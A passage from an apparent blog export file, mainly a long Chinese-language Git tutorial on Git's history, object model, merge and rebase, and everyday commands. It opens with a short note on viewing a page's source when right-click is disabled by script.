color:#939393;'&gt;&amp;copy;隔壁的萌面人&lt;/a&gt; &lt;/br&gt; &lt;a href="http://www.beian.miit.gov.cn/" style='text-decoration:none;color:#939393;'&gt;渝ICP备17014860号-2&lt;/a&gt; &lt;/br&gt; &lt;a target="_blank" href="" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"&gt;&lt;img src="http://www.xuexianswer.com/beian/logo.png" style="float:left;" /&gt; &lt;p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;"&gt;渝公网安备 50011402500333号&lt;/p&gt; &lt;/a&gt; &lt;br&gt; &lt;span align="right" style="display:inline-block;float:right;color:#303030;text-decoration:none;"&gt;友情链接： &lt;a href="http://www.xuexianswer.com/" style="color:#303030;text-decoration:none;"&gt;萌面人资料铺&lt;/a&gt;&amp;nbsp; &lt;a href="http://www.mengmianren.com/" style="color:#303030;text-decoration:none;"&gt;萌面人网&lt;/a&gt;&amp;nbsp; &lt;a href="http://mengmianren.cc/" style="color:#303030;text-decoration:none;"&gt;萌面人CC网&lt;/a&gt;&amp;nbsp; &lt;a href="http://mengmianren.pro/" style="color:#303030;text-decoration:none;"&gt;萌面人PRO网&lt;/a&gt; &lt;/span&gt;&lt;/div&gt; &lt;/footer&gt; &lt;/div&gt; &lt;/div&gt; &lt;meta http-equiv="imagetoolbar" content="no"&gt; &lt;script type="text/javascript"&gt; document.oncontextmenu = function() &#123; return false; &#125;; document.onselectstart = function() &#123; if (event.srcElement.type != "text" &amp;&amp; event.srcElement.type != "textarea" &amp;&amp; event.srcElement.type != "password") &#123; return false; &#125; else &#123; return true; &#125; &#125;; if (window.sidebar) &#123; document.onmousedown = function(e) &#123; var obj = e.target; if (obj.tagName.toUpperCase() == 'SELECT' || obj.tagName.toUpperCase() == "INPUT" || obj.tagName.toUpperCase() == "TEXTAREA" || obj.tagName.toUpperCase() == "PASSWORD") &#123; return true; &#125; else &#123; return false; &#125; &#125;; &#125; document.ondragstart = function() &#123; return false; &#125;; &lt;/script&gt; &lt;script type='text/javascript'&gt; var pvcArgsFrontend = &#123; "mode": "ajax", "requestURL": "http:\/\/www.gebidemengmianren.com\/wp-content\/plugins\/post-views-counter\/includes\/ajax.php", "postID": "198", "nonce": "8b28046242" &#125;; &lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/plugins/post-views-counter/js/frontend.js?ver=1.3.1'&gt;&lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/plugins/bj-lazy-load/js/bj-lazy-load.min.js?ver=2'&gt;&lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/wp-embed.min.js?ver=6f0a90e1258fc95d5c87f731d5ec4784'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 破解方法 查看源码的一个简单方法： 在浏览器的地址栏输入以下东西，即可查看源码 1view-source:url 假如是通过js禁用的话，可以在控制台下输入 1234document.body.oncontextmenu="return true";//右键菜单document.body.onselectstart="return true";//文本选择]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git]]></title>
    <url>%2F2019%2F09%2F23%2Fgit%2F</url>
    <content type="text"><![CDATA[Git 引用： Git详细使用教程 Git教程 Git本地服务器搭建及使用方法 Git原理入门解析 使用原理视角看Git Git 的诞生： 很多人都知道，Linus 在 1991 年创建了开源的 Linux，从此，Linux 系统不断发展，已经成为最大的服务器系统软件了。 Linus 虽然创建了 Linux，但 Linux 的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为 Linux 编写代码，那 Linux 的代码是如何管理的呢？ 事实是，在 2002 年以前，世界各地的志愿者把源代码文件通过 diff 的方式发给 Linus，然后由 Linus 本人通过手工方式合并代码！ 你也许会想，为什么 Linus 不把 Linux 代码放到版本控制系统里呢？不是有 CVS、SVN 这些免费的版本控制系统吗？因为 Linus 坚定地反对 CVS 和 SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比 CVS、SVN 好用，但那是付费的，和 Linux 的开源精神不符。 不过，到了 2002 年，Linux 系统已经发展了十年了，代码库之大让 Linus 很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是 Linus 选择了一个商业的版本控制系统 BitKeeper，BitKeeper 的东家 BitMover 公司出于人道主义精神，授权 Linux 社区免费使用这个版本控制系统。 安定团结的大好局面在 2005 年就被打破了，原因是 Linux 社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发 Samba 的 Andrew 试图破解 BitKeeper 的协议（这么干的其实也不只他一个），被 BitMover 公司发现了（监控工作做得不错！），于是 BitMover 公司怒了，要收回 Linux 社区的免费使用权。 Linus 可以向 BitMover 公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是：Linus 花了两周时间自己用 C 写了一个分布式版本控制系统，这就是 Git！一个月之内，Linux 系统的源码已经由 Git 管理了！牛是怎么定义的呢？大家可以体会一下。 Git 迅速成为最流行的分布式版本控制系统，尤其是 2008 年，GitHub 网站上线了，它为开源项目免费提供 Git 存储，无数开源项目开始迁移至 GitHub，包括 jQuery，PHP，Ruby 等等。 历史就是这么偶然，如果不是当年 BitMover 公司威胁 Linux 社区，可能现在我们就没有免费而超级好用的 Git 了。 Git是什么Git是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。Git是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。Git与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。 先说集中式版本控制系统，版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。中央服务器就好比是一个图书馆，你要改一本书，必须先从图书馆借出来，然后回到家自己改，改完了，再放回图书馆。 那分布式版本控制系统与集中式版本控制系统有何不同呢？首先，分布式版本控制系统根本没有 “中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件 A，你的同事也在他的电脑上改了文件 A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。集中式版本控制系统最大的毛病就是必须联网才能工作。 Git与SVN的区别GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。Git 与 SVN 区别点： GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。 2.GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。 GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。 GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。 GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 Git原理详细图文解释可参考此篇文章使用原理视角看Git，里面详细用图文解释了git的版本控制原理 git的工作流程大概如下： 克隆 Git 资源作为工作目录。 在克隆的资源上添加或修改文件。 如果其他人修改了，你可以更新资源。 在提交前查看修改。 提交修改。 在修改完成后，如果发现错误，可以撤回提交并再次修改并提交。 基本概念我们先来理解下Git 工作区、暂存区和版本库概念 工作区：就是你项目的目录（可见目录）。 缓存区：英文叫stage, 或index。一般存放在”git目录”下的index文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。 版本库：工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。 下面这个图展示了工作区、版本库中的暂存区和版本库之间的关系： 如果我们要对项目进行管理，就切换到该项目目录底下，使用git init命令，进行初始化 1$git init git init 命令只会做一件事，就是在项目的根目录下创建一个 .git 的子目录，用来保存当前项目的一些版本信息，我们可以继续使用 tree -a 命令查看该目录的完整结构，如下： 1234567891011121314151617181920212223242526272829$tree -a.└── .git ├── HEAD ├── branches ├── config ├── description ├── hooks │ ├── applypatch-msg.sample │ ├── commit-msg.sample │ ├── fsmonitor-watchman.sample │ ├── post-update.sample │ ├── pre-applypatch.sample │ ├── pre-commit.sample │ ├── pre-push.sample │ ├── pre-rebase.sample │ ├── pre-receive.sample │ ├── prepare-commit-msg.sample │ └── update.sample ├── index ├── info │ └── exclude ├── objects │ ├── .DS_Store │ ├── info │ └── pack └── refs ├── heads └── tags Git目录解析config 目录config 是仓库的配置文件，一个典型的配置文件如下，我们创建的远端，分支都在等信息都在配置文件里有表现；fetch 操作的行为也是在这里配置的： 12345678910111213141516[core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true[remote "origin"] url = git@github.com:yanhaijing/zepto.fullpage.git fetch = +refs/heads/*:refs/remotes/origin/*[branch "master"] remote = origin merge = refs/heads/master[branch "dev"] remote = origin merge = refs/heads/dev objects 目录Git 可以通过一种算法可以得到任意文件的 “指纹”（40 位 16 进制数字），然后通过文件指纹存取数据，存取的数据都位于 objects 目录。 例如我们可以手动创建一个测试文本文件并使用 git add . 命令来观察 .git 文件夹出现的变化： 12$ touch test.txt$ git add . git add . 命令就是用于把当前新增的变化添加进 Git 本地仓库的，在我们使用后，我们惊奇的发现 .git 目录下的 objects/ 目录下多了一个目录： 12345678910111213141516171819202122$ tree -a.├── .git│ ├── HEAD│ ├── branches│ ├── config│ ├── description│ ├── hooks│ │ ├── 节省篇幅..省略..│ ├── index│ ├── info│ │ └── exclude│ ├── objects│ │ ├── .DS_Store│ │ ├── e6│ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391│ │ ├── info│ │ └── pack│ └── refs│ ├── heads│ └── tags└── test.txt 我们可以使用 git hash-object test.txt 命令来看看刚才我们创建的 test.txt 的 “文件指纹”： 12$ git hash-object test.txte69de29bb2d1d6434b8b29ae775ad8c2e48c5391 这时候我们可以发现，新创建的目录 e6 其实是该文件哈希值的前两位，这其实是 Git 做的一层类似于索引一样的东西，并且默认采用 16 进制的两位数来当索引，是非常合适的。 这边其实引入了Sha-1算法 SHA-1将文件中的内容通过通过计算生成一个 40 位长度的hash值。 Sha-1的非常有特点： 由文件内容计算出的hash值 hash值相同，文件内容相同 对于添加的内容，无论我们执行多少次，都会得到相同的结果。因此，文件的sha-1值是可以作为文件的唯一 id 。同时，它还有一个额外的功能，校验文件完整性。 objects 目录下有 3 种类型的数据： Blob； Tree; Commit； 文件都被存储为 blob 类型的文件，文件夹被存储为 tree 类型的文件，创建的提交节点被存储为 Commit 类型的数据； 一般我们系统中的目录(tree)，在 Git 会像下面这样存储： 而 Commit 类型的数据则整合了 tree 和 blob 类型，保存了当前的所有变化，例如我们可以再在刚才的目录下新建一个目录，并添加一些文件试试： 1234567891011121314151617181920212223242526$ mkdir test$ touch test/test.file$ tree -a.├── .git│ ├── HEAD│ ├── branches│ ├── config│ ├── description│ ├── hooks│ │ ├── 节省篇幅..省略..│ ├── index│ ├── info│ │ └── exclude│ ├── objects│ │ ├── .DS_Store│ │ ├── e6│ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391│ │ ├── info│ │ └── pack│ └── refs│ ├── heads│ └── tags├── test│ └── test.file└── test.txt 提交完Commit在观察变化 123456789101112131415161718192021222324252627282930313233343536373839$ git commit -a -m "test: 新增测试文件夹和测试文件观察.git文件的变化"[master (root-commit) 30d51b1] test: 新增测试文件夹和测试文件观察.git文件的变化 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 test.txt$ tree -a.├── .git│ ├── COMMIT_EDITMSG│ ├── HEAD│ ├── branches│ ├── config│ ├── description│ ├── hooks│ │ ├── ...省略...│ ├── index│ ├── info│ │ └── exclude│ ├── logs│ │ ├── HEAD│ │ └── refs│ │ └── heads│ │ └── master│ ├── objects│ │ ├── .DS_Store│ │ ├── 30│ │ │ └── d51b1edd2efd551dd6bd52d4520487b5708c0e│ │ ├── 5e│ │ │ └── fb9bc29c482e023e40e0a2b3b7e49cec842034│ │ ├── e6│ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391│ │ ├── info│ │ └── pack│ └── refs│ ├── heads│ │ └── master│ └── tags├── test│ └── test.file└── test.txt 首先我们可以观察到我们提交了一个 Commit 的时候在第一句话里面返回了一个短的像是哈希值一样的东西： [master (root-commit) 30d51b1] 中 的 30d51b1，对应的我们也可以在 objects 找到刚才 commit 的对象，我们可以使用 git cat-file -p 命令输出一下当前文件的内容： 123456$ git cat-file -p 30d5tree 5efb9bc29c482e023e40e0a2b3b7e49cec842034author 我没有三颗心脏 1565742122 +0800committer 我没有三颗心脏 1565742122 +0800test: 新增测试文件夹和测试文件观察.git文件的变化 我们发现这里面有提交的内容信息、作者信息、提交者信息以及 commit message，当然我们可以进一步看到提交的内容具体有哪些： 12$ git cat-file -p 5efb100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 test.txt 我们再试着提交一个 commit 来观察变化: 12345678910111213$ touch test/test2.file$ git commit -a -m "test: 新增加一个 commit 以观察变化."[master 9dfabac] test: 新增加一个 commit 以观察变化. 2 files changed, 0 insertions(+), 0 deletions(-) create mode 100644 test/test.file create mode 100644 test/test2.file$ git cat-file -p 9dfabactree c562bfb9441352f4c218b0028148289f1ea7d7cdparent 30d51b1edd2efd551dd6bd52d4520487b5708c0eauthor 龙滔 1565878699 +0800committer 龙滔 1565878699 +0800test: 新增加一个 commit 以观察变化. 可以观察到这一次的 commit 多了一个 parent 的行，其中的 “指纹” 和上一次的 commit 一模一样，当我们提交两个 commit 之后我们的 Git 仓库可以简化为下图： 说明：其中因为我们 test 文件夹新增了文件，也就是出现了变化，所以就被标识成了新的 tree 类型的对象； refs 目录refs 目录存储都是引用文件，如本地分支，远端分支，标签等 refs/heads/xxx 本地分支 refs/remotes/origin/xxx 远端分支 refs/tags/xxx 本地tag 引用文件的内容都是 40 位长度的 commit 12$ cat .git/refs/heads/master9dfabac68470a588a4b4a78742249df46438874a 这就像是一个指针一样，它指向了你的最后一次提交（例如这里就指向了第二次提交的 commit），我们补充上分支信息，现在的 Git 仓库就会像下图所示： HEAD 目录HEAD 目录下存储的是当前所在的位置，其内容是分支的名称： 12$ cat HEADref: refs/heads/master 我们再补充上 HEAD 的信息，现在的 Git 仓库如下图所示： git的冲突处理以下主要参考以下两篇文章 git冲突处理图解 使用原理视角看 Git 讲完git的目录结构，我们可知道分支在git中仅是一个指针，但是在分布式工作中，无可避免的会遇见冲突（分支的合并） 图上的情况，并不是移动分支指针就能够解决问题的，它需要一种合并策略。首先我们需要明确的是谁与谁的合并，是 2，3 与 4， 5， 6 两条线的合并吗？其实并不是的，真实合并的其实只有 3 和 6，因为每一次的提交都包含了项目完整的快照，即合并只是 tree 与 tree 的合并。 这可能说起来有点绕，我们可以先来想一个简单的算法，用来比较 3 和 6 的不同。如果我们只是单纯的比较 3 和 6 的信息，其实并没有意义，因为它们之间并不能确切的表达出当前的冲突状态。因此我们需要选取它们两个分支的分歧点（merge base）作为参考点，进行比较。 首先我们把 1 作为基础，然后把 1、3、6 中所有的文件做一个列表，然后依次遍历这个列表中的文件。我们现在拿列表中的一个文件进行举例，把在提交在 1、3、6 中的该文件分别称为版本1、版本3、版本6，可能出现如下几种情况： 1. 版本 1、版本 3、版本 6 的 “指纹” 值都相同：这种情况则说明没有冲突；2. 版本 3 or 版本 6 至少有一个与版本 1 状态相同（指的是指纹值相同或都不存在）：这种情况可以自动合并，比如版本 1 中存在一个文件，在版本 3 中没有对该文件进行修改，而版本 6 中删除了这个文件，则以版本 6 为准就可以了；3. 版本 3 or 版本 6 都与版本 1 的状态不同：这种情况复杂一些，自动合并策略很难生效了，所以需要手动解决； merge 操作在解决完冲突后，我们可以将修改的内容提交为一个新的提交，这就是 merge。 可以看到 merge 是一种不修改分支历史提交记录的方式，这也是我们常用的方式。但是这种方式在某些情况下使用起来不太方便，比如我们创建了一些提交发送给管理者，管理者在合并操作中产生了冲突，还需要去解决冲突，这无疑增加了他人的负担。 而我们使用 rebase 可以解决这种问题。 rebase 操作假设我们的分支结构如下： rebase 会把从 Merge Base 以来的所有提交，以补丁的形式一个一个重新打到目标分支上。这使得目标分支合并该分支的时候会直接 Fast Forward（可以简单理解为直接后移指针），即不会产生任何冲突。提交历史是一条线，这对强迫症患者可谓是一大福音。 其实 rebase 主要是在 .git/rebase-merge 下生成了两个文件，分别为 git-rebase-todo 和 done 文件，这两个文件的作用光看名字就大概能够看得出来。git-rebase-todo 中存放了 rebase 将要操作的 commit，而 done 存放正操作或已操作完毕的 commit，比如我们这里，git-rebase-todo 存放了 4、5、6 三个提交。 首先 Git 会把 4 这个 commit 放入 done，表示正在操作 4，然后将 4 以补丁的方式打到 3 上，形成了新的 4`，这一步是可能产生冲突的，如果有冲突，需要解决冲突之后才能继续操作。 接着按同样的方式把 5、6 都放入 done，最后把指针移动到最新的提交 6 上，就完成了 rebase 的操作。 从刚才的图中，我们就可以看到 rebase 的一个缺点，那就是修改了分支的历史提交。如果已经将分支推送到了远程仓库，会导致无法将修改后的分支推送上去，必须使用 -f 参数（force）强行推送。 所以使用 rebase 最好不要在公共分支上进行操作。 Squash and Merge 操作简单说就是压缩提交，把多次的提交融合到一个 commit 中，这样的好处不言而喻，我们着重来讨论一下实现的技术细节，还是以我们上面最开始的分支情况为例，首先，Git 会创建一个临时分支，指向当前 feature 的最新 commit。 然后按照上面 rebase 的方式，变基到 master 的最新 commit 处。 接着用 rebase 来 squash 之，压缩这些提交为一个提交。 最后以 fast forward 的方式合并到 master 中。 可见此时 master 分支多且只多了一个描述了这次改动的提交，这对于大型工程，保持主分支的简洁易懂有很大的帮助。 git基本操作git配置Git 提供了一个叫做 git config 的工具，专门用来配置或读取相应的工作环境变量。这些环境变量，决定了 Git 在各个环节的具体工作方式和行为。这些变量可以存放在以下三个不同的地方： /etc/gitconfig 文件：系统中对所有用户都普遍适用的配置。若使用 git config 时用 –system 选项，读写的就是这个文件。~/.gitconfig 文件：用户目录下的配置文件只适用于该用户。若使用 git config 时用 –global 选项，读写的就是这个文件。当前项目的 Git 目录中的配置文件（也就是工作目录中的 .git/config 文件）：这里的配置仅仅针对当前项目有效。每一个级别的配置都会覆盖上层的相同配置，所以 .git/config 里的配置会覆盖 /etc/gitconfig 中的同名变量。 在 Windows 系统上，Git 会找寻用户主目录下的 .gitconfig 文件。主目录即 $HOME 变量指定的目录，一般都是 C:\Documents and Settings\$USER。 此外，Git 还会尝试找寻 /etc/gitconfig 文件，只不过看当初 Git 装在什么目录，就以此作为根目录来定位。 1.用户信息 git config user在使用git提交前，一定要配置提交者个人的用户名称和电子邮件 12$ git config --global user.name "wyndam"$ git config --global user.email "only.night@qq.com" 如果用了--global选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉–global选项重新配置即可，新的设定保存在当前项目的 .git/config 文件里。 2.文本编辑器设置Git默认使用的文本编辑器, 一般可能会是 Vi 或者 Vim。如果你有其他偏好，比如 Emacs 的话，可以重新设置： 1$ git config --global core.editor emacs 3.差异分析工具还有一个比较常用的是，在解决合并冲突时使用哪种差异分析工具。比如要改用 vimdiff 的话： 1$ git config --global merge.tool vimdiff Git 可以理解 kdiff3，tkdiff，meld，xxdiff，emerge，vimdiff，gvimdiff，ecmerge，和 opendiff 等合并工具的输出信息。当然，你也可以指定使用自己开发的工具。 4.查看配置信息 git config --list要检查已有的配置信息，可以使用 git config –list 命令： 12345678910111213141516171819$ git config --listcore.symlinks=falsecore.autocrlf=truecolor.diff=autocolor.status=autocolor.branch=autocolor.interactive=truepack.packsizelimit=2ghelp.format=htmlhttp.sslcainfo=E:/Platform/Git/mingw32/ssl/certs/ca-bundle.crtdiff.astextplain.textconv=astextplainrebase.autosquash=truefilter.lfs.clean=git-lfs clean %ffilter.lfs.smudge=git-lfs smudge %ffilter.lfs.required=trueuser.name=Wyndamuser.email=only.night@qq.comcore.editor=subl 有时候会看到重复的变量名，那就说明它们来自不同的配置文件（比如 /etc/gitconfig 和 ~/.gitconfig），不过最终 Git 实际采用的是最后一个。这些配置我们也可以在 ~/.gitconfig 或 /etc/gitconfig 看到，如下所示： 123456789[filter "lfs"] clean = git-lfs clean %f smudge = git-lfs smudge %f required = true[user] name = Wyndam email = only.night@qq.com[core] editor = subl 也可以直接查阅某个环境变量的设定，只要把特定的名字跟在后面即可，像这样： 123$ git config user.emailmagic@outlook.com 新建git本地仓库Git 使用 git init 命令来初始化一个 Git 仓库，Git 的很多命令都需要在 Git 的仓库中运行，所以 git init 是使用 Git 的第一个命令。在执行完成 git init 命令后，Git 仓库会生成一个 .git 目录，该目录包含了资源的所有元数据，其他的项目目录保持不变（不像 SVN 会在每个子目录生成 .svn 目录，Git 只在仓库的根目录生成 .git 目录）。 在工作目录下使用命令git init 1$git init (path) 若没有指定path，则默认当前目录下建立git仓库。 初始化后，会在工作目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交： 12$ git add . (path|file)$ git commit -m "inital commit" 以上命令就是把文件/文件夹提交至仓库中，若是远程仓库，还需要命令git push 复制远程仓库 git clone我们使用 git clone 从现有 Git 仓库中拷贝项目（类似 svn checkout）。克隆仓库的命令格式为: 1$ git clone &lt;repo|url&gt; (&lt;directory&gt;) 参数说明： \&lt;repo|url&gt;：为Git仓库的地址url \：为将git储存至目标目录，若为空，则默认本地目录 Git支持ssh，git，http和https协议（此外，可以使用ftp和ftps进行获取，但这效率低下且不建议使用；请勿使用它）。 ssh://[user@]host.xz[:port]/path/to/repo.git/ git://host.xz[:port]/path/to/repo.git/ http[s]://host.xz[:port]/path/to/repo.git/ ftp[s]://host.xz[:port]/path/to/repo.git/ 也可以用类似scp的语法进行clone（实际上是ssh协议） [user@]host.xz:path/to/repo.git/ 查看状态git statusgit status 以查看在你上次提交之后是否有修改。我演示该命令的时候加了 -s 参数，以获得简短的结果输出。如果没加该参数会详细输出内容： 123456789$ git statusOn branch masterInitial commitChanges to be committed: (use "git rm --cached &lt;file&gt;..." to unstage) new file: README.md 从缓存中移除文件 git reset HEADgit reset HEAD 命令用于取消已缓存的内容。我们先改动文件 README 文件，内容如下： 123#README.md##This is readme markdown file HelloWorld.java 文件修改为： 12345public class HelloWorld &#123; public static void main(String[] args) &#123; System.out.println("Hello World!"); &#125;&#125; 现在两个文件修改后，都提交到了缓存区，我们现在要取消其中一个的缓存，操作如下： 12345678910111213$ git status -s M HelloWorld.java M README.md$ git add .$ git status -sM HelloWorld.javaM README.md$ git reset HEAD -- HelloWorld.javaUnstaged changes after reset:M HelloWorld.java$ git status -s M HelloWorld.javaM README.md 现在执行 git commit，只会将 README.md 文件的改动提交，而 HelloWorld.java 是没有的。 12345$ git commit -m "change"[master ad5f6fe] change 1 file changed, 1 insertion(+), 1 deletion(-)$ git status -s M HelloWorld.java 可以看到 HelloWorld.java 文件的修改并为提交。这时我们可以使用以下命令将 HelloWorld.java 的修改提交： 123456$ git commit -am "修改 HelloWorld.java 文件"[master a055c08] 修改 HelloWorld.java 文件 1 file changed, 1 insertion(+), 1 deletion(-)$ git statusOn branch masternothing to commit, working directory clean 简而言之，执行 git reset HEAD 以取消之前 git add 添加，但不希望包含在下一提交快照中的缓存。 从缓存以及工作目录删除文件 git rmgit rm 会将条目从缓存区中移除。这与 git reset HEAD 将条目取消缓存是有区别的。 “取消缓存”的意思就是将缓存区恢复为我们做出修改之前的样子。默认情况下，git rm file 会将文件从缓存区和你的硬盘中（工作目录）删除。如果你要在工作目录中留着该文件，可以使用 git rm –cached：如我们删除 hello.java文件：(包括在本地目录下的文件，可能需要选项-f) 1234$ git rm HelloWorld.javarm 'HelloWorld.java'$ lsREADME.md 不从工作区中删除文件： 1234$ git rm README.md --cachedrm 'README.md'$ lsREADME.md 修改缓存中文件名 git mvgit mv 命令做得所有事情就是 git rm –cached 命令的操作， 重命名磁盘上的文件，然后再执行 git add 把新文件添加到缓存区。我们先把刚移除的 README 添加回来： 1234$ git add README.md$ git mv README.md README$ lsREADME Git分支管理几乎每一种版本控制系统都以某种形式支持分支。使用分支意味着你可以从开发主线上分离开来，然后在不影响主线的同时继续工作。有人把 Git 的分支模型称为”必杀技特性”，而正是因为它，将 Git 从版本控制系统家族里区分出来。创建分支命令： 1234567891011#创建分支$ git branch [branch name]#切换分支$ git checkout [branch name]#创建并切换分支$ git checkout -b [branch name]#合并分支$ git merge#删除分支$ git branch -d [branch name] Git分支管理12345678910111213141516171819202122#列出问题$ git branch#无参数时，该命令会列出本地分支$ git branch* master#创建分支$ git branch testbranch$ git branch* branch4testbranch$ git branch testing$ git branch -D testingDeleted branch testing (was 84b13b9).#合并分支,将分支[branch name] 合并到当前分支$ git merge [branch name]$ git merge testUpdating b04e1bb..d3c2604Fast-forward testB | 0 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 testB Git 查看提交历史 git log123456789101112131415161718192021222324252627282930313233343536373839404142434445464748$ git logcommit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/test, test)Author: Magic &lt;xxx@qq.com&gt;Date: Sat Sep 28 23:41:42 2019 +0800 ffcommit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)Author: Magic &lt;xxx@qq.com&gt;Date: Sat Sep 28 23:40:34 2019 +0800 fuck#可以用 --oneline 选项来查看历史记录的简洁的版本$ git log --onelined3c2604 (HEAD -&gt; master, origin/test, test) ffb04e1bb (origin/master) fuck#可以用 --graph 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项：$ git log --graph* commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/test, test)| Author: Magic-King &lt;xxx@qq.com&gt;| Date: Sat Sep 28 23:41:42 2019 +0800|| ff|* commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master) Author: Magic-King &lt;xxx@qq.com&gt; Date: Sat Sep 28 23:40:34 2019 +0800 fuck #可以用 ‘--reverse’参数来逆向显示所有日志$ git log --reversecommit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)Author: Magic-King &lt;xxx@qq.com&gt;Date: Sat Sep 28 23:40:34 2019 +0800 fuckcommit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/test, test)Author: Magic-King &lt;xxx@qq.com&gt;Date: Sat Sep 28 23:41:42 2019 +0800 ff Git 标签 git tag如果达到一个重要的阶段，并希望永远记住那个特别的提交快照，可以使用 git tag 给它打上标签。比如说，我们想为我们的项目发布一个”1.0”版本。 可以用 git tag -a v1.0 命令给最新一次提交打上（HEAD）”v1.0”的标签。-a 选项意为”创建一个带注解的标签”。 不用 -a 选项也可以执行的，但它不会记录这标签是啥时候打的，谁打的，也不会让你添加个标签的注解。 我推荐一直创建带注解的标签。 12345678910111213$ git log --oneline --graph --decorate* 2b5970d (HEAD -&gt; master, tag: v1.0) Merge branch 'change_site'|\| * d17a0a0 (change_site) change the site* | e2714c9 新增加一行|/* 202199d (newtest) add test.txt file* a055c08 修改 HelloWorld.java 文件* ad5f6fe 修改* c2c167c 修改HelloWorld.java文件* f9393bf third commit ``* 316fafc second commit* fdd5c53 inital commit 如果我们忘了给某个提交打标签，又将它发布了，我们可以给它追加标签。例如，假设我们发布了提交 85fc7e7(上面实例最后一行)，但是那时候忘了给它打标签。 我们现在也可以： 1234567891011121314$ git tag -a v0.9 a055c08$ git log --oneline --graph --decorate* 2b5970d (HEAD -&gt; master, tag: v1.0) Merge branch 'change_site'|\| * d17a0a0 (change_site) change the site* | e2714c9 新增加一行|/* 202199d (newtest) add test.txt file* a055c08 (tag: v0.9) 修改 HelloWorld.java 文件* ad5f6fe 修改* c2c167c 修改HelloWorld.java文件* f9393bf third commit ``* 316fafc second commit* fdd5c53 inital commit 如果要查看所有标签可以使用以下命令： 1$ git tag 指定标签信息命令： 1git tag -a &lt;tagname&gt; -m "标签" PGP签名标签命令： 1git tag -s &lt;tagname&gt; -m "标签" Git 远程仓库的操作查看当前远程库12345$ git remoteorigin$ git remote -vorigin git@xx.xx.xxx.xxx:/test.git (fetch)origin git@xx.xx.xxx.xxx:/test.git (push) 提取远程库1$ git pull 该命令就是在执行 git fetch 之后紧接着执行 git merge 远程分支到你所在的任意分支。假设你配置好了一个远程仓库，并且你想要提取更新的数据，你可以首先执行 git fetch [alias] 告诉 Git 去获取它有你没有的数据，然后你可以执行 git merge [alias]/[branch] 以将服务器上的任何更新（假设有人这时候推送到服务器了）合并到你的当前分支。 接下来我们在 Github 上点击”test.txt” 并在线修改它。之后我们在本地更新修改。 123456789101112$ git fetch originremote: Counting objects: 3, done.remote: Compressing objects: 100% (3/3), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From github.com:onlynight/GitAdd 774112b..37be49b master -&gt; origin/master$ git merge origin/masterUpdating 774112b..37be49bFast-forward test.txt | 1 + 1 file changed, 1 insertion(+) 推送远程库推送你的新分支与数据到某个远端仓库命令 12345#该命令将你的 [branch] 分支推送成为 [alias] 远程仓库上的 [branch] 分支$ git push [alias] [branch]$ git push origin masterEverything up-to-date 删除远程分支注意：如果要删除远程分支同样也是使用push命令，在分支前加上”:”表示删除远程分支，代码如下 1$ git push origin :&lt;branch name&gt; 删除本地仓库的远程仓库链接删除远程仓库你可以使用命令 1234567891011121314git remote rm [alias]$ git remote -vorigin 